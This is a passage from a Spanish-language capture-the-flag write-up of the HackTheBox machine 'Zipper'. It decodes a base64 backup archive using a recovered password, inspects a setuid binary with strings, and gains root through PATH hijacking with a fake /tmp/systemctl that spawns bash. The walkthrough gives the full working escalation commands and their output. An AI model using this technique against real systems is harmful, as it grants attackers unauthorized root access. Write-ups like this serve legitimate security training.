156pVP/yDFLtohBuEkHFegW2cErb5Qa8PS1nbcUdsSclnZ+qP/7OfC3wfdtqBxHUboM1ra07sYts
ykedDJI2UeHvlzvU7ZQPfx9E1JKkO4SAuIqcx8p+7r/pD6xtO+CaNz+OsuHiHF2+2UNbw7i7iccv
ctrdEqXo00pzaFvylDANrrLQY5I2ZCeK22ut3cJQSM7qAdzBc+eK+VT5Ycwk/BCy8ihWZw9mz18y
rkMQUEd0+kJkl+9NQh7sSZrIqCnccrGrSPwyqJHNnIWf4Ue8E0kbBph5rVOmEoO9Etvzr7m9uov/
a02y7tTjKjJEsS0xtaTf44tk/VRQW5qA6vvd6kO/uQfoIxyV3UGadzORY4AsuBqqX6FiOjDENy5N
rfLSF8gl3AXgwWYQvETSvS6JdGlpy+SFPUf95d9AAb2ukd2GllP7r1fqL05/MqGhX2V2Z+bcwvdV
wLL85kM9BQjuAto9g6xcB7PhkqylYToXthBNr03su4LzK/QDNGHiAVXYF3AsyjOTnKVbcmzQMUn8
FCAYREz2c4ERwmRQQ/1FhVhajTpJxwhdB3dtx71Q/OBvCOB45kBvFn8O1YQB0J1i6oLFs9JS0mU6
c4xoE1Bi3r9h7QZ7ZrKGdA+rAyCydqrctpaXZ7C7ouTk+fRd7z9BFE7i13nKwbE3KLA7Z1KFRvFp
FXtst6jLS6QCJoUxM6Ee2qIA7TY7NHs3hYr1T92JEfTgh7t4ilXxh5GjZJOxbp6v7upBbYaUXHzQ
cOQt398vshbybgZ3sp8nEGwTLhIhM9DAgaZyzY4YBVIB9TNdvLeH1cCWpGDiCnhw0SKrryLGxr75
9CvXZUkKIEW+sRcnCWnWIFSxDvQjDSYd+SHfiE3I2eMs3npOZp7N/+xKw/KQX084iJQSrNsp+tlj
ECBs5jayxk1Eeggyws1kcacc2PgS4qA/HwhasecTFVtnhg42JrJKWjiQlHJrILCRHgxHwCI7oh2J
JhY2dHlB6+rb2wUodDpw3cTCMZau9PEMnkx6F4XlY7cT3HEE+r12NWr8w26KpqU6pfXgonyHW3FF
yNuv4LC6jRzuGMLGF0j3It4fLXCGptK+2mv5I8zv1IL8p0zK+D2xCG+zGly3ot7jEyRMIQ9DZh2P
VEOTfH3w1GqKNTrFjo9d//JMfOxRvit84j4sI1TMSKIu1ansv613w27v6tvnATUTjffqP3vgiZKR
EA8lbgtpBOhUUOCQWGDNfUbcz5BHERl+6Zju8V3vJqIp9VVQg1HHDO6MBU0K9RE2yI0IHKx+bbda
rZbmoeuLZVtW6iT1yuR+jQgaY/mcS7DYNMG+DPVhgAvr1EBLwJw5X4cvtmNyrbB0XwEplLyCak5y
WdC8KxgweaYScMUWuF22DRk0IsqXFUJ5ExHg4ZMnAOGNKtcTuQr6hMObf0yPlaD9z59wuguHQLVv
gAel/Q8kfAAAgTMHrjGe3F2c5Rb9lxG/8bFhhv+xauz/DEQ0rc64ggDFkIgBhBA/jw07F9TRBd8g
W3lxgsoDYcvkcUA1KrlCvaqzSDarZmXV+dGu2l/3gwnlT94HlRzhuGzjjGL+vTHcngYKp3Nofg/g
df770LfNCAPP+YtF5M6SOABqQlJi4nCkZ2s6jD47FoM7BjVtangm4ENKDG4VY6Vv2yxOCmlYJaIi
mFAAAAAXBorQAQmAqQAHCwEAASMDAQEFXQAQAAAMgMYKAYhZ9rAAAA==
```

Creamos el archivo zapper\_backup-2019-01-10.7z.b64 con el contenido anterior y decodeamos:

```text
xbytemx@laptop:~/htb/zipper$ base64 -d zapper_backup-2019-01-10.7z.b64 > zapper_backup-2019-01-10.7z
xbytemx@laptop:~/htb/zipper$ 7z x -ozapper20190110 -pZippityDoDah zapper_backup-2019-01-10.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4200U CPU @ 1.60GHz (40651),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3004 bytes (3 KiB)

Extracting archive: zapper_backup-2019-01-10.7z
--
Path = zapper_backup-2019-01-10.7z
Type = 7z
Physical Size = 3004
Headers Size = 236
Method = LZMA2:13 BCJ 7zAES
Solid = -
Blocks = 2

Everything is Ok

Files: 2
Size:       7750
Compressed: 3004
xbytemx@laptop:~/htb/zipper$ cd zapper20190110/
xbytemx@laptop:~/htb/zipper/zapper20190110$ ls
backup.sh  zabbix-service
```

Veamos vía strings el contenido de zabbix-service:

```text
tdx
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
puts
stdin
printf
fgets
strcspn
system
__cxa_finalize
setgid
strcmp
__libc_start_main
__stack_chk_fail
GLIBC_2.1.3
GLIBC_2.4
GLIBC_2.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Y[^]
UWVS
[^_]
start or stop?:
start
systemctl daemon-reload && systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
[!] ERROR: Unrecognized Option
;*2$"
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7281
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
zabbix-service.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strcmp@@GLIBC_2.0
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
strcspn@@GLIBC_2.0
fgets@@GLIBC_2.0
_edata
__stack_chk_fail@@GLIBC_2.4
__x86.get_pc_thunk.dx
__cxa_finalize@@GLIBC_2.1.3
__data_start
setgid@@GLIBC_2.0
puts@@GLIBC_2.0
system@@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
stdin@@GLIBC_2.0
_fp_hw
__bss_start
main
setuid@@GLIBC_2.0
__stack_chk_fail_local
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

Importante, vemos declarada la función setuid(), vemos que hay llamadas a system(), inclusive se distinguen comandos de systemctl. Si reverseamos un poco el binario, veremos que se hace setuid(0), lo cual es consistente con los bits que tiene el binario `-rwsr-sr-x` de root:root.

Al ejecutarlo veremos que falla en nuestra shell, por lo que hacemos un upgrade a bash:

```text
$ cd /home/zapper/utils
$ ./zabbix-service
start or stop?: [!] ERROR: Unrecognized Option
$ printf "start\n" | ./zabbix-service
start or stop?: $ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ printf "start" | ./zabbix-service
start or stop?: $
$
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zabbix@zipper:/home/zapper/utils$ ./zabbix-service
./zabbix-service
start or stop?: start
start
zabbix@zipper:/home/zapper/utils$
```

Ya que tenemos un mejor control sobre los pipes, podemos realizar una escalación de privilegios porque los comandos ejecutados desde el binario zabbix\-service confían en la variable PATH, por lo que cambiando la variable PATH y suplantando el binario systemctl por cualquier cosa, podemos ejecutar cualquier cosa como root (gracias setuid 0). En este caso lo sustituimos por un script de bash:

```text
zabbix@zipper:/home/zapper/utils$ printf '#!/bin/bash\n\n/bin/bash -i' > /tmp/systemctl
<intf '#!/bin/bash\n\n/bin/bash -i' > /tmp/systemctl
zabbix@zipper:/home/zapper/utils$ chmod +x /tmp/systemctl
chmod +x /tmp/systemctl
zabbix@zipper:/home/zapper/utils$ PATH="/tmp:$PATH" ./zabbix-service
PATH="/tmp:$PATH" ./zabbix-service
start or stop?: start
start
root@zipper:/home/zapper/utils# id
id
uid=0(root) gid=0(root) groups=0(root),113(zabbix)
```

# cat root.txt and user.txt

... We got root flag and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
